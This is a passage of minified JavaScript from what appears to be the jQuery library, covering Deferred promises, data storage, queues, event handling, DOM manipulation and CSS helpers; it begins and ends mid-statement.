e=n&&n.apply(this,arguments);e&&m(e.promise)?e.promise().progress(r.notify).done(r.resolve).fail(r.reject):r[t[0]+"With"](this,n?[e]:arguments)})}),i=null}).promise()},then:function(t,n,r){var u=0;function l(i,o,a,s){return function(){var n=this,r=arguments,e=function(){var e,t;if(!(i<u)){if((e=a.apply(n,r))===o.promise())throw new TypeError("Thenable self-resolution");t=e&&("object"==typeof e||"function"==typeof e)&&e.then,m(t)?s?t.call(e,l(u,o,R,s),l(u,o,M,s)):(u++,t.call(e,l(u,o,R,s),l(u,o,M,s),l(u,o,R,o.notifyWith))):(a!==R&&(n=void 0,r=[e]),(s||o.resolveWith)(n,r))}},t=s?e:function(){try{e()}catch(e){S.Deferred.exceptionHook&&S.Deferred.exceptionHook(e,t.stackTrace),u<=i+1&&(a!==M&&(n=void 0,r=[e]),o.rejectWith(n,r))}};i?t():(S.Deferred.getStackHook&&(t.stackTrace=S.Deferred.getStackHook()),C.setTimeout(t))}}return S.Deferred(function(e){o[0][3].add(l(0,e,m(r)?r:R,e.notifyWith)),o[1][3].add(l(0,e,m(t)?t:R)),o[2][3].add(l(0,e,m(n)?n:M))}).promise()},promise:function(e){return null!=e?S.extend(e,a):a}},s={};return S.each(o,function(e,t){var n=t[2],r=t[5];a[t[1]]=n.add,r&&n.add(function(){i=r},o[3-e][2].disable,o[3-e][3].disable,o[0][2].lock,o[0][3].lock),n.add(t[3].fire),s[t[0]]=function(){return s[t[0]+"With"](this===s?void 0:this,arguments),this},s[t[0]+"With"]=n.fireWith}),a.promise(s),e&&e.call(s,s),s},when:function(e){var n=arguments.length,t=n,r=Array(t),i=s.call(arguments),o=S.Deferred(),a=function(t){return function(e){r[t]=this,i[t]=1<arguments.length?s.call(arguments):e,--n||o.resolveWith(r,i)}};if(n<=1&&(I(e,o.done(a(t)).resolve,o.reject,!n),"pending"===o.state()||m(i[t]&&i[t].then)))return o.then();while(t--)I(i[t],a(t),o.reject);return o.promise()}});var W=/^(Eval|Internal|Range|Reference|Syntax|Type|URI)Error$/;S.Deferred.exceptionHook=function(e,t){C.console&&C.console.warn&&e&&W.test(e.name)&&C.console.warn("jQuery.Deferred exception: "+e.message,e.stack,t)},S.readyException=function(e){C.setTimeout(function(){throw e})};var F=S.Deferred();function $(){E.removeEventListener("DOMContentLoaded",$),C.removeEventListener("load",$),S.ready()}S.fn.ready=function(e){return F.then(e)["catch"](function(e){S.readyException(e)}),this},S.extend({isReady:!1,readyWait:1,ready:function(e){(!0===e?--S.readyWait:S.isReady)||(S.isReady=!0)!==e&&0<--S.readyWait||F.resolveWith(E,[S])}}),S.ready.then=F.then,"complete"===E.readyState||"loading"!==E.readyState&&!E.documentElement.doScroll?C.setTimeout(S.ready):(E.addEventListener("DOMContentLoaded",$),C.addEventListener("load",$));var B=function(e,t,n,r,i,o,a){var s=0,u=e.length,l=null==n;if("object"===w(n))for(s in i=!0,n)B(e,t,s,n[s],!0,o,a);else if(void 0!==r&&(i=!0,m(r)||(a=!0),l&&(a?(t.call(e,r),t=null):(l=t,t=function(e,t,n){return l.call(S(e),n)})),t))for(;s<u;s++)t(e[s],n,a?r:r.call(e[s],s,t(e[s],n)));return i?e:l?t.call(e):u?t(e[0],n):o},_=/^-ms-/,z=/-([a-z])/g;function U(e,t){return t.toUpperCase()}function X(e){return e.replace(_,"ms-").replace(z,U)}var V=function(e){return 1===e.nodeType||9===e.nodeType||!+e.nodeType};function G(){this.expando=S.expando+G.uid++}G.uid=1,G.prototype={cache:function(e){var t=e[this.expando];return t||(t={},V(e)&&(e.nodeType?e[this.expando]=t:Object.defineProperty(e,this.expando,{value:t,configurable:!0}))),t},set:function(e,t,n){var r,i=this.cache(e);if("string"==typeof t)i[X(t)]=n;else for(r in t)i[X(r)]=t[r];return i},get:function(e,t){return void 0===t?this.cache(e):e[this.expando]&&e[this.expando][X(t)]},access:function(e,t,n){return void 0===t||t&&"string"==typeof t&&void 0===n?this.get(e,t):(this.set(e,t,n),void 0!==n?n:t)},remove:function(e,t){var n,r=e[this.expando];if(void 0!==r){if(void 0!==t){n=(t=Array.isArray(t)?t.map(X):(t=X(t))in r?[t]:t.match(P)||[]).length;while(n--)delete r[t[n]]}(void 0===t||S.isEmptyObject(r))&&(e.nodeType?e[this.expando]=void 0:delete e[this.expando])}},hasData:function(e){var t=e[this.expando];return void 0!==t&&!S.isEmptyObject(t)}};var Y=new G,Q=new G,J=/^(?:\{[\w\W]*\}|\[[\w\W]*\])$/,K=/[A-Z]/g;function Z(e,t,n){var r,i;if(void 0===n&&1===e.nodeType)if(r="data-"+t.replace(K,"-$&").toLowerCase(),"string"==typeof(n=e.getAttribute(r))){try{n="true"===(i=n)||"false"!==i&&("null"===i?null:i===+i+""?+i:J.test(i)?JSON.parse(i):i)}catch(e){}Q.set(e,t,n)}else n=void 0;return n}S.extend({hasData:function(e){return Q.hasData(e)||Y.hasData(e)},data:function(e,t,n){return Q.access(e,t,n)},removeData:function(e,t){Q.remove(e,t)},_data:function(e,t,n){return Y.access(e,t,n)},_removeData:function(e,t){Y.remove(e,t)}}),S.fn.extend({data:function(n,e){var t,r,i,o=this[0],a=o&&o.attributes;if(void 0===n){if(this.length&&(i=Q.get(o),1===o.nodeType&&!Y.get(o,"hasDataAttrs"))){t=a.length;while(t--)a[t]&&0===(r=a[t].name).indexOf("data-")&&(r=X(r.slice(5)),Z(o,r,i[r]));Y.set(o,"hasDataAttrs",!0)}return i}return"object"==typeof n?this.each(function(){Q.set(this,n)}):B(this,function(e){var t;if(o&&void 0===e)return void 0!==(t=Q.get(o,n))?t:void 0!==(t=Z(o,n))?t:void 0;this.each(function(){Q.set(this,n,e)})},null,e,1<arguments.length,null,!0)},removeData:function(e){return this.each(function(){Q.remove(this,e)})}}),S.extend({queue:function(e,t,n){var r;if(e)return t=(t||"fx")+"queue",r=Y.get(e,t),n&&(!r||Array.isArray(n)?r=Y.access(e,t,S.makeArray(n)):r.push(n)),r||[]},dequeue:function(e,t){t=t||"fx";var n=S.queue(e,t),r=n.length,i=n.shift(),o=S._queueHooks(e,t);"inprogress"===i&&(i=n.shift(),r--),i&&("fx"===t&&n.unshift("inprogress"),delete o.stop,i.call(e,function(){S.dequeue(e,t)},o)),!r&&o&&o.empty.fire()},_queueHooks:function(e,t){var n=t+"queueHooks";return Y.get(e,n)||Y.access(e,n,{empty:S.Callbacks("once memory").add(function(){Y.remove(e,[t+"queue",n])})})}}),S.fn.extend({queue:function(t,n){var e=2;return"string"!=typeof t&&(n=t,t="fx",e--),arguments.length<e?S.queue(this[0],t):void 0===n?this:this.each(function(){var e=S.queue(this,t,n);S._queueHooks(this,t),"fx"===t&&"inprogress"!==e[0]&&S.dequeue(this,t)})},dequeue:function(e){return this.each(function(){S.dequeue(this,e)})},clearQueue:function(e){return this.queue(e||"fx",[])},promise:function(e,t){var n,r=1,i=S.Deferred(),o=this,a=this.length,s=function(){--r||i.resolveWith(o,[o])};"string"!=typeof e&&(t=e,e=void 0),e=e||"fx";while(a--)(n=Y.get(o[a],e+"queueHooks"))&&n.empty&&(r++,n.empty.add(s));return s(),i.promise(t)}});var ee=/[+-]?(?:\d*\.|)\d+(?:[eE][+-]?\d+|)/.source,te=new RegExp("^(?:([+-])=|)("+ee+")([a-z%]*)$","i"),ne=["Top","Right","Bottom","Left"],re=E.documentElement,ie=function(e){return S.contains(e.ownerDocument,e)},oe={composed:!0};re.getRootNode&&(ie=function(e){return S.contains(e.ownerDocument,e)||e.getRootNode(oe)===e.ownerDocument});var ae=function(e,t){return"none"===(e=t||e).style.display||""===e.style.display&&ie(e)&&"none"===S.css(e,"display")};function se(e,t,n,r){var i,o,a=20,s=r?function(){return r.cur()}:function(){return S.css(e,t,"")},u=s(),l=n&&n[3]||(S.cssNumber[t]?"":"px"),c=e.nodeType&&(S.cssNumber[t]||"px"!==l&&+u)&&te.exec(S.css(e,t));if(c&&c[3]!==l){u/=2,l=l||c[3],c=+u||1;while(a--)S.style(e,t,c+l),(1-o)*(1-(o=s()/u||.5))<=0&&(a=0),c/=o;c*=2,S.style(e,t,c+l),n=n||[]}return n&&(c=+c||+u||0,i=n[1]?c+(n[1]+1)*n[2]:+n[2],r&&(r.unit=l,r.start=c,r.end=i)),i}var ue={};function le(e,t){for(var n,r,i,o,a,s,u,l=[],c=0,f=e.length;c<f;c++)(r=e[c]).style&&(n=r.style.display,t?("none"===n&&(l[c]=Y.get(r,"display")||null,l[c]||(r.style.display="")),""===r.style.display&&ae(r)&&(l[c]=(u=a=o=void 0,a=(i=r).ownerDocument,s=i.nodeName,(u=ue[s])||(o=a.body.appendChild(a.createElement(s)),u=S.css(o,"display"),o.parentNode.removeChild(o),"none"===u&&(u="block"),ue[s]=u)))):"none"!==n&&(l[c]="none",Y.set(r,"display",n)));for(c=0;c<f;c++)null!=l[c]&&(e[c].style.display=l[c]);return e}S.fn.extend({show:function(){return le(this,!0)},hide:function(){return le(this)},toggle:function(e){return"boolean"==typeof e?e?this.show():this.hide():this.each(function(){ae(this)?S(this).show():S(this).hide()})}});var ce,fe,pe=/^(?:checkbox|radio)$/i,de=/<([a-z][^\/\0>\x20\t\r\n\f]*)/i,he=/^$|^module$|\/(?:java|ecma)script/i;ce=E.createDocumentFragment().appendChild(E.createElement("div")),(fe=E.createElement("input")).setAttribute("type","radio"),fe.setAttribute("checked","checked"),fe.setAttribute("name","t"),ce.appendChild(fe),v.checkClone=ce.cloneNode(!0).cloneNode(!0).lastChild.checked,ce.innerHTML="<textarea>x</textarea>",v.noCloneChecked=!!ce.cloneNode(!0).lastChild.defaultValue,ce.innerHTML="<option></option>",v.option=!!ce.lastChild;var ge={thead:[1,"<table>","</table>"],col:[2,"<table><colgroup>","</colgroup></table>"],tr:[2,"<table><tbody>","</tbody></table>"],td:[3,"<table><tbody><tr>","</tr></tbody></table>"],_default:[0,"",""]};function ye(e,t){var n;return n="undefined"!=typeof e.getElementsByTagName?e.getElementsByTagName(t||"*"):"undefined"!=typeof e.querySelectorAll?e.querySelectorAll(t||"*"):[],void 0===t||t&&A(e,t)?S.merge([e],n):n}function ve(e,t){for(var n=0,r=e.length;n<r;n++)Y.set(e[n],"globalEval",!t||Y.get(t[n],"globalEval"))}ge.tbody=ge.tfoot=ge.colgroup=ge.caption=ge.thead,ge.th=ge.td,v.option||(ge.optgroup=ge.option=[1,"<select multiple='multiple'>","</select>"]);var me=/<|&#?\w+;/;function xe(e,t,n,r,i){for(var o,a,s,u,l,c,f=t.createDocumentFragment(),p=[],d=0,h=e.length;d<h;d++)if((o=e[d])||0===o)if("object"===w(o))S.merge(p,o.nodeType?[o]:o);else if(me.test(o)){a=a||f.appendChild(t.createElement("div")),s=(de.exec(o)||["",""])[1].toLowerCase(),u=ge[s]||ge._default,a.innerHTML=u[1]+S.htmlPrefilter(o)+u[2],c=u[0];while(c--)a=a.lastChild;S.merge(p,a.childNodes),(a=f.firstChild).textContent=""}else p.push(t.createTextNode(o));f.textContent="",d=0;while(o=p[d++])if(r&&-1<S.inArray(o,r))i&&i.push(o);else if(l=ie(o),a=ye(f.appendChild(o),"script"),l&&ve(a),n){c=0;while(o=a[c++])he.test(o.type||"")&&n.push(o)}return f}var be=/^([^.]*)(?:\.(.+)|)/;function we(){return!0}function Te(){return!1}function Ce(e,t){return e===function(){try{return E.activeElement}catch(e){}}()==("focus"===t)}function Ee(e,t,n,r,i,o){var a,s;if("object"==typeof t){for(s in"string"!=typeof n&&(r=r||n,n=void 0),t)Ee(e,s,n,r,t[s],o);return e}if(null==r&&null==i?(i=n,r=n=void 0):null==i&&("string"==typeof n?(i=r,r=void 0):(i=r,r=n,n=void 0)),!1===i)i=Te;else if(!i)return e;return 1===o&&(a=i,(i=function(e){return S().off(e),a.apply(this,arguments)}).guid=a.guid||(a.guid=S.guid++)),e.each(function(){S.event.add(this,t,i,r,n)})}function Se(e,i,o){o?(Y.set(e,i,!1),S.event.add(e,i,{namespace:!1,handler:function(e){var t,n,r=Y.get(this,i);if(1&e.isTrigger&&this[i]){if(r.length)(S.event.special[i]||{}).delegateType&&e.stopPropagation();else if(r=s.call(arguments),Y.set(this,i,r),t=o(this,i),this[i](),r!==(n=Y.get(this,i))||t?Y.set(this,i,!1):n={},r!==n)return e.stopImmediatePropagation(),e.preventDefault(),n&&n.value}else r.length&&(Y.set(this,i,{value:S.event.trigger(S.extend(r[0],S.Event.prototype),r.slice(1),this)}),e.stopImmediatePropagation())}})):void 0===Y.get(e,i)&&S.event.add(e,i,we)}S.event={global:{},add:function(t,e,n,r,i){var o,a,s,u,l,c,f,p,d,h,g,y=Y.get(t);if(V(t)){n.handler&&(n=(o=n).handler,i=o.selector),i&&S.find.matchesSelector(re,i),n.guid||(n.guid=S.guid++),(u=y.events)||(u=y.events=Object.create(null)),(a=y.handle)||(a=y.handle=function(e){return"undefined"!=typeof S&&S.event.triggered!==e.type?S.event.dispatch.apply(t,arguments):void 0}),l=(e=(e||"").match(P)||[""]).length;while(l--)d=g=(s=be.exec(e[l])||[])[1],h=(s[2]||"").split(".").sort(),d&&(f=S.event.special[d]||{},d=(i?f.delegateType:f.bindType)||d,f=S.event.special[d]||{},c=S.extend({type:d,origType:g,data:r,handler:n,guid:n.guid,selector:i,needsContext:i&&S.expr.match.needsContext.test(i),namespace:h.join(".")},o),(p=u[d])||((p=u[d]=[]).delegateCount=0,f.setup&&!1!==f.setup.call(t,r,h,a)||t.addEventListener&&t.addEventListener(d,a)),f.add&&(f.add.call(t,c),c.handler.guid||(c.handler.guid=n.guid)),i?p.splice(p.delegateCount++,0,c):p.push(c),S.event.global[d]=!0)}},remove:function(e,t,n,r,i){var o,a,s,u,l,c,f,p,d,h,g,y=Y.hasData(e)&&Y.get(e);if(y&&(u=y.events)){l=(t=(t||"").match(P)||[""]).length;while(l--)if(d=g=(s=be.exec(t[l])||[])[1],h=(s[2]||"").split(".").sort(),d){f=S.event.special[d]||{},p=u[d=(r?f.delegateType:f.bindType)||d]||[],s=s[2]&&new RegExp("(^|\\.)"+h.join("\\.(?:.*\\.|)")+"(\\.|$)"),a=o=p.length;while(o--)c=p[o],!i&&g!==c.origType||n&&n.guid!==c.guid||s&&!s.test(c.namespace)||r&&r!==c.selector&&("**"!==r||!c.selector)||(p.splice(o,1),c.selector&&p.delegateCount--,f.remove&&f.remove.call(e,c));a&&!p.length&&(f.teardown&&!1!==f.teardown.call(e,h,y.handle)||S.removeEvent(e,d,y.handle),delete u[d])}else for(d in u)S.event.remove(e,d+t[l],n,r,!0);S.isEmptyObject(u)&&Y.remove(e,"handle events")}},dispatch:function(e){var t,n,r,i,o,a,s=new Array(arguments.length),u=S.event.fix(e),l=(Y.get(this,"events")||Object.create(null))[u.type]||[],c=S.event.special[u.type]||{};for(s[0]=u,t=1;t<arguments.length;t++)s[t]=arguments[t];if(u.delegateTarget=this,!c.preDispatch||!1!==c.preDispatch.call(this,u)){a=S.event.handlers.call(this,u,l),t=0;while((i=a[t++])&&!u.isPropagationStopped()){u.currentTarget=i.elem,n=0;while((o=i.handlers[n++])&&!u.isImmediatePropagationStopped())u.rnamespace&&!1!==o.namespace&&!u.rnamespace.test(o.namespace)||(u.handleObj=o,u.data=o.data,void 0!==(r=((S.event.special[o.origType]||{}).handle||o.handler).apply(i.elem,s))&&!1===(u.result=r)&&(u.preventDefault(),u.stopPropagation()))}return c.postDispatch&&c.postDispatch.call(this,u),u.result}},handlers:function(e,t){var n,r,i,o,a,s=[],u=t.delegateCount,l=e.target;if(u&&l.nodeType&&!("click"===e.type&&1<=e.button))for(;l!==this;l=l.parentNode||this)if(1===l.nodeType&&("click"!==e.type||!0!==l.disabled)){for(o=[],a={},n=0;n<u;n++)void 0===a[i=(r=t[n]).selector+" "]&&(a[i]=r.needsContext?-1<S(i,this).index(l):S.find(i,this,null,[l]).length),a[i]&&o.push(r);o.length&&s.push({elem:l,handlers:o})}return l=this,u<t.length&&s.push({elem:l,handlers:t.slice(u)}),s},addProp:function(t,e){Object.defineProperty(S.Event.prototype,t,{enumerable:!0,configurable:!0,get:m(e)?function(){if(this.originalEvent)return e(this.originalEvent)}:function(){if(this.originalEvent)return this.originalEvent[t]},set:function(e){Object.defineProperty(this,t,{enumerable:!0,configurable:!0,writable:!0,value:e})}})},fix:function(e){return e[S.expando]?e:new S.Event(e)},special:{load:{noBubble:!0},click:{setup:function(e){var t=this||e;return pe.test(t.type)&&t.click&&A(t,"input")&&Se(t,"click",we),!1},trigger:function(e){var t=this||e;return pe.test(t.type)&&t.click&&A(t,"input")&&Se(t,"click"),!0},_default:function(e){var t=e.target;return pe.test(t.type)&&t.click&&A(t,"input")&&Y.get(t,"click")||A(t,"a")}},beforeunload:{postDispatch:function(e){void 0!==e.result&&e.originalEvent&&(e.originalEvent.returnValue=e.result)}}}},S.removeEvent=function(e,t,n){e.removeEventListener&&e.removeEventListener(t,n)},S.Event=function(e,t){if(!(this instanceof S.Event))return new S.Event(e,t);e&&e.type?(this.originalEvent=e,this.type=e.type,this.isDefaultPrevented=e.defaultPrevented||void 0===e.defaultPrevented&&!1===e.returnValue?we:Te,this.target=e.target&&3===e.target.nodeType?e.target.parentNode:e.target,this.currentTarget=e.currentTarget,this.relatedTarget=e.relatedTarget):this.type=e,t&&S.extend(this,t),this.timeStamp=e&&e.timeStamp||Date.now(),this[S.expando]=!0},S.Event.prototype={constructor:S.Event,isDefaultPrevented:Te,isPropagationStopped:Te,isImmediatePropagationStopped:Te,isSimulated:!1,preventDefault:function(){var e=this.originalEvent;this.isDefaultPrevented=we,e&&!this.isSimulated&&e.preventDefault()},stopPropagation:function(){var e=this.originalEvent;this.isPropagationStopped=we,e&&!this.isSimulated&&e.stopPropagation()},stopImmediatePropagation:function(){var e=this.originalEvent;this.isImmediatePropagationStopped=we,e&&!this.isSimulated&&e.stopImmediatePropagation(),this.stopPropagation()}},S.each({altKey:!0,bubbles:!0,cancelable:!0,changedTouches:!0,ctrlKey:!0,detail:!0,eventPhase:!0,metaKey:!0,pageX:!0,pageY:!0,shiftKey:!0,view:!0,"char":!0,code:!0,charCode:!0,key:!0,keyCode:!0,button:!0,buttons:!0,clientX:!0,clientY:!0,offsetX:!0,offsetY:!0,pointerId:!0,pointerType:!0,screenX:!0,screenY:!0,targetTouches:!0,toElement:!0,touches:!0,which:!0},S.event.addProp),S.each({focus:"focusin",blur:"focusout"},function(t,e){S.event.special[t]={setup:function(){return Se(this,t,Ce),!1},trigger:function(){return Se(this,t),!0},_default:function(e){return Y.get(e.target,t)},delegateType:e}}),S.each({mouseenter:"mouseover",mouseleave:"mouseout",pointerenter:"pointerover",pointerleave:"pointerout"},function(e,i){S.event.special[e]={delegateType:i,bindType:i,handle:function(e){var t,n=e.relatedTarget,r=e.handleObj;return n&&(n===this||S.contains(this,n))||(e.type=r.origType,t=r.handler.apply(this,arguments),e.type=i),t}}}),S.fn.extend({on:function(e,t,n,r){return Ee(this,e,t,n,r)},one:function(e,t,n,r){return Ee(this,e,t,n,r,1)},off:function(e,t,n){var r,i;if(e&&e.preventDefault&&e.handleObj)return r=e.handleObj,S(e.delegateTarget).off(r.namespace?r.origType+"."+r.namespace:r.origType,r.selector,r.handler),this;if("object"==typeof e){for(i in e)this.off(i,t,e[i]);return this}return!1!==t&&"function"!=typeof t||(n=t,t=void 0),!1===n&&(n=Te),this.each(function(){S.event.remove(this,e,n,t)})}});var ke=/<script|<style|<link/i,Ae=/checked\s*(?:[^=]|=\s*.checked.)/i,Ne=/^\s*<!\[CDATA\[|\]\]>\s*$/g;function je(e,t){return A(e,"table")&&A(11!==t.nodeType?t:t.firstChild,"tr")&&S(e).children("tbody")[0]||e}function De(e){return e.type=(null!==e.getAttribute("type"))+"/"+e.type,e}function qe(e){return"true/"===(e.type||"").slice(0,5)?e.type=e.type.slice(5):e.removeAttribute("type"),e}function Le(e,t){var n,r,i,o,a,s;if(1===t.nodeType){if(Y.hasData(e)&&(s=Y.get(e).events))for(i in Y.remove(t,"handle events"),s)for(n=0,r=s[i].length;n<r;n++)S.event.add(t,i,s[i][n]);Q.hasData(e)&&(o=Q.access(e),a=S.extend({},o),Q.set(t,a))}}function He(n,r,i,o){r=g(r);var e,t,a,s,u,l,c=0,f=n.length,p=f-1,d=r[0],h=m(d);if(h||1<f&&"string"==typeof d&&!v.checkClone&&Ae.test(d))return n.each(function(e){var t=n.eq(e);h&&(r[0]=d.call(this,e,t.html())),He(t,r,i,o)});if(f&&(t=(e=xe(r,n[0].ownerDocument,!1,n,o)).firstChild,1===e.childNodes.length&&(e=t),t||o)){for(s=(a=S.map(ye(e,"script"),De)).length;c<f;c++)u=e,c!==p&&(u=S.clone(u,!0,!0),s&&S.merge(a,ye(u,"script"))),i.call(n[c],u,c);if(s)for(l=a[a.length-1].ownerDocument,S.map(a,qe),c=0;c<s;c++)u=a[c],he.test(u.type||"")&&!Y.access(u,"globalEval")&&S.contains(l,u)&&(u.src&&"module"!==(u.type||"").toLowerCase()?S._evalUrl&&!u.noModule&&S._evalUrl(u.src,{nonce:u.nonce||u.getAttribute("nonce")},l):b(u.textContent.replace(Ne,""),u,l))}return n}function Oe(e,t,n){for(var r,i=t?S.filter(t,e):e,o=0;null!=(r=i[o]);o++)n||1!==r.nodeType||S.cleanData(ye(r)),r.parentNode&&(n&&ie(r)&&ve(ye(r,"script")),r.parentNode.removeChild(r));return e}S.extend({htmlPrefilter:function(e){return e},clone:function(e,t,n){var r,i,o,a,s,u,l,c=e.cloneNode(!0),f=ie(e);if(!(v.noCloneChecked||1!==e.nodeType&&11!==e.nodeType||S.isXMLDoc(e)))for(a=ye(c),r=0,i=(o=ye(e)).length;r<i;r++)s=o[r],u=a[r],void 0,"input"===(l=u.nodeName.toLowerCase())&&pe.test(s.type)?u.checked=s.checked:"input"!==l&&"textarea"!==l||(u.defaultValue=s.defaultValue);if(t)if(n)for(o=o||ye(e),a=a||ye(c),r=0,i=o.length;r<i;r++)Le(o[r],a[r]);else Le(e,c);return 0<(a=ye(c,"script")).length&&ve(a,!f&&ye(e,"script")),c},cleanData:function(e){for(var t,n,r,i=S.event.special,o=0;void 0!==(n=e[o]);o++)if(V(n)){if(t=n[Y.expando]){if(t.events)for(r in t.events)i[r]?S.event.remove(n,r):S.removeEvent(n,r,t.handle);n[Y.expando]=void 0}n[Q.expando]&&(n[Q.expando]=void 0)}}}),S.fn.extend({detach:function(e){return Oe(this,e,!0)},remove:function(e){return Oe(this,e)},text:function(e){return B(this,function(e){return void 0===e?S.text(this):this.empty().each(function(){1!==this.nodeType&&11!==this.nodeType&&9!==this.nodeType||(this.textContent=e)})},null,e,arguments.length)},append:function(){return He(this,arguments,function(e){1!==this.nodeType&&11!==this.nodeType&&9!==this.nodeType||je(this,e).appendChild(e)})},prepend:function(){return He(this,arguments,function(e){if(1===this.nodeType||11===this.nodeType||9===this.nodeType){var t=je(this,e);t.insertBefore(e,t.firstChild)}})},before:function(){return He(this,arguments,function(e){this.parentNode&&this.parentNode.insertBefore(e,this)})},after:function(){return He(this,arguments,function(e){this.parentNode&&this.parentNode.insertBefore(e,this.nextSibling)})},empty:function(){for(var e,t=0;null!=(e=this[t]);t++)1===e.nodeType&&(S.cleanData(ye(e,!1)),e.textContent="");return this},clone:function(e,t){return e=null!=e&&e,t=null==t?e:t,this.map(function(){return S.clone(this,e,t)})},html:function(e){return B(this,function(e){var t=this[0]||{},n=0,r=this.length;if(void 0===e&&1===t.nodeType)return t.innerHTML;if("string"==typeof e&&!ke.test(e)&&!ge[(de.exec(e)||["",""])[1].toLowerCase()]){e=S.htmlPrefilter(e);try{for(;n<r;n++)1===(t=this[n]||{}).nodeType&&(S.cleanData(ye(t,!1)),t.innerHTML=e);t=0}catch(e){}}t&&this.empty().append(e)},null,e,arguments.length)},replaceWith:function(){var n=[];return He(this,arguments,function(e){var t=this.parentNode;S.inArray(this,n)<0&&(S.cleanData(ye(this)),t&&t.replaceChild(e,this))},n)}}),S.each({appendTo:"append",prependTo:"prepend",insertBefore:"before",insertAfter:"after",replaceAll:"replaceWith"},function(e,a){S.fn[e]=function(e){for(var t,n=[],r=S(e),i=r.length-1,o=0;o<=i;o++)t=o===i?this:this.clone(!0),S(r[o])[a](t),u.apply(n,t.get());return this.pushStack(n)}});var Pe=new RegExp("^("+ee+")(?!px)[a-z%]+$","i"),Re=/^--/,Me=function(e){var t=e.ownerDocument.defaultView;return t&&t.opener||(t=C),t.getComputedStyle(e)},Ie=function(e,t,n){var r,i,o={};for(i in t)o[i]=e.style[i],e.style[i]=t[i];for(i in r=n.call(e),t)e.style[i]=o[i];return r},We=new RegExp(ne.join("|"),"i"),Fe="[\\x20\\t\\r\\n\\f]",$e=new RegExp("^"+Fe+"+|((?:^|[^\\\\])(?:\\\\.)*)"+Fe+"+$","g");function Be(e,t,n){var r,i,o,a,s=Re.test(t),u=e.style;return(n=n||Me(e))&&(a=n.getPropertyValue(t)||n[t],s&&(a=a.replace($e,"$1")),""!==a||ie(e)||(a=S.style(e,t)),!v.pixelBoxStyles()&&Pe.test(a)&&We.test(t)&&(r=u.width,i=u.minWidth,o=u.maxWidth,u.minWidth=u.maxWidth=u.width=a,a=n.width,u.width=r,u.minWidth=i,u.maxWidth=o)),void 0!==a?a+"":a}function _e(e,t){return{get:function(){if(!e())return(this.get=t).apply(this,arguments);delete this.get}}}!function(){function e(){if(l){u.style.cssText="position:absolute;left:-11111px;width:60px;margin-top:1px;padding:0;border:0",l.style.cssText="position:relative;display:block;box-sizing:border-box;overflow:scroll;margin:auto;border:1px;padding:1px;width:60%;top:1%",re.appendChild(u).appendChild(l);var e=C.getComputedStyle(l);n="1%"!==e.top,s=12===t(e.marginLeft),l.style.right="60%",o=36===t(e.right),r=36===t(e.width),l.style.position="absolute",i=12===t(l.offsetWidth/3),re.removeChild(u),l=null}}function t(e){return Math.round(parseFloat(e))}var n,r,i,o,a,s,u=E.createElement("div"),l=E.createElement("div");l.style&&(l.style.backgroundClip="content-box",l.cloneNode(!0).style.backgroundClip="",v.clearCloneStyle="content-box"===l.style.backgroundClip,S.extend(v,{boxSizingReliable:function(){return e(),r},pixelBoxStyles:function(){return e(),o},pixelPosition:function(){return e(),n},reliableMarginLeft:function(){return e(),s},scrollboxSize:function(){return e(),i},reliableTrDimensions:function(){var e,t,n,r;return null==a&&(e=E.createElement("table"),t=E.createElement("tr"),n=E.createElement("div"),e.style.cssText="position:absolute;left:-11111px;border-collapse:separate",t.style.cssText="border:1px solid",t.style.height="1px",n.style.height="9px",n.style.display="block",re.appendChild(e).appendChild(t).appendChild(n),r=C.getComputedStyle(t),a=parseInt(r.height,10)+parseInt(r.borderTopWidth,10)+parseInt(r.borderBottomWidth,10)===t.offsetHeight,re.removeChild(e)),a}}))}();var ze=["Webkit","Moz","ms"],Ue=E.createElement("div").style,Xe={};function Ve(e){var t=S.cssProps[e]||Xe[e];return t||(e in Ue?e:Xe[e]=function(e){var t=e[0].toUpperCase()+e.slice(1),n=ze.length;while(n--)if((e=ze[n]+t)in Ue)return e}(e)||e)}var Ge=/^(none|table(?!-c[ea]).+)/,Ye={position:"absolute",visibility:"hidden",display:"block"},Qe={letterSpacing:"0",fontWeight:"400"};function Je(e,t,n){var r=te.exec(t);return r?Math.max(0,r[2]-(n||0))+(r[3]||"px"):t}function Ke(e,t,n,r,i,o){var a="width"===t?1:0,s=0,u=0;if(n===(r?"border":"content"))return 0;for(;a<4;a+=2)"margin"===n&&(u+=S.css(e,n+ne[a],!0,i)),r?("content"===n&&(u-=S.css(e,"padding"+ne[a],!0,i)),"margin"!==n&&(u-=S.css(e,"border"+ne[a]+"Width",!0,i))):(u+=S.css(e,"padding"+ne[a],!0,i),"padding"!==n?u+=S.css(e,"border"+ne[a]+"Width",!0,i):s+=S.css(e,"border"+ne[a]+"Width",!0,i));return!r&&0<=o&&(u+=Math.max(0,Math.ceil(e["offset"+t[0].toUpperCase()+t.slice(1)]-o-u-s-.5))||0),u}function Ze(e,t,n){var r=Me(e),i=(!v.boxSizingReliable()||n)&&"border-box"===S.css(e,"boxSizing",!1,r),o=i,a=Be(e,t,r),s="offset"+t[0].toUpperCase()+t.slice(1);if(Pe.test(a)){if(!n)return a;a="auto"}return(!v.boxSizingReliable()&&i||!v.reliableTrDimensions()&&A(e,"tr")||"auto"===a||!parseFloat(a)&&"inline"===S.css(e,"display",!1,r))&&e.getClientRects().length&&(i="border-box"===S.css(e,"boxSizing",!1,r),(o=s in e)&&(a=e[s])),(a=parseFloat(a)||0)+Ke(e,t,n||(i?"border":"content"),o,r,a)+"px"}function et(e,t,n,r,i){return new et.prototype.init(e,t,n,r,i)}S.extend({cssHooks:{opacity:{get:function(e,t){if(t){var n=Be(e,"opacity");return""===n?"1":n}}}},cssNumber:{animationIterationCount:!0,columnCount:!0,fillOpacity:!0,flexGrow:!0,flexShrink:!0,fontWeight:!0,gridArea:!0,gridColumn:!0,gridColumnEnd:!0,gridColumnStart:!0,gridRow:!0,gridRowEnd:!0,gridRowStart:!0,lineHeight:!0,opacity:!0,order:!0,orphans:!0,widows:!0,zIndex:!0,zoom:!0},cssProps:{},style:function(e,t,n,r){if(e&&3!==e.nodeType&&8!==e.nodeType&&e.style){var i,o,a,s=X(t),u=Re.test(t),l=e.style;if(u||(t=Ve(s)),a=S.cssHooks[t]||S.cssHooks[s],void 0===n)return a&&"get"in a&&void 0!==(i=a.get(e,!1,r))?i:l[t];"string"===(o=typeof n)&&(i=te.exec(n))&&i[1]&&(n=se(e,t,i),o="number"),null!=n&&n==n&&("number"!==o||u||(n+=i&&i[3]||(S.cssNumber[s]?"":"px")),v.clearCloneStyle||""!==n||0!==t.indexOf("background")||(l[t]="inherit"),a&&"set"in a&&void 